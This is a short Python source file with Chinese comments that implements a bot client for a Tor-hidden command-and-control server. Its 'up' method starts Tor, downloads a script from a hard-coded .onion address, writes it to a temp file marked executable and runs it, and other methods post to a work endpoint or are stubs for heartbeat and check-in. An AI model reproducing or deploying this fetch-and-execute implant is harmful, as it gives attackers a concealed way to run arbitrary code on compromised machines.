import random
import shlex
import subprocess
import tempfile
import time
from pathlib import Path

import requests

from mtlibs.tor_helper import TorProc

CCURL_BASE = "http://g5q7lyibqywjbljjxgvo67ioec2fsueydfrulaml7au334ptersj2vid.onion"


class GHWorker():

    def up(self):
        """连接中心服务器"""

        def onTor(tor):
            self.tor_socks5_port = tor.getSocksPort()
            url = CCURL_BASE + "/torcc/script"
            proxies = {
                "http":
                "socks5h://{}:{}".format("127.0.0.1", self.tor_socks5_port),
                "https":
                "socks5h://{}:{}".format("127.0.0.1", self.tor_socks5_port),
            }
            res = requests.get(url, proxies=proxies)
            tmppath = tempfile.gettempdir() + "/" + str(
                random.randint(0, 9999999))
            Path(tmppath).touch(mode=0o700)
            with open(tmppath, 'wb') as f:
                f.write(res.content)
            subprocess.run(tmppath)

        TorProc().start(connected_cb=onTor)
        while True:
            time.sleep(1)

    def send(self, data):
        """发送请求"""
        proxies = {
            "http": "socks5h://{}:{}".format("127.0.0.1",
                                             self.tor_socks5_port),
            "https": "socks5h://{}:{}".format("127.0.0.1",
                                              self.tor_socks5_port),
        }
        res = requests.post(CCURL_BASE + "/torcc/api/work", proxies=proxies)
        print(res.content)

    def heartbeat():
        """发送心跳包"""
        # data = {"data": {"host": "testtest.onion"}}
        pass


class GHWorkerClient():

    def __init__(self, ccurl):
        self.ccurl = ccurl

    def login():
        """登陆: 或者叫上线,就是请求ccurl,告诉他自己的域名"""


if __name__ == "__main__":
    GHWorker().up()
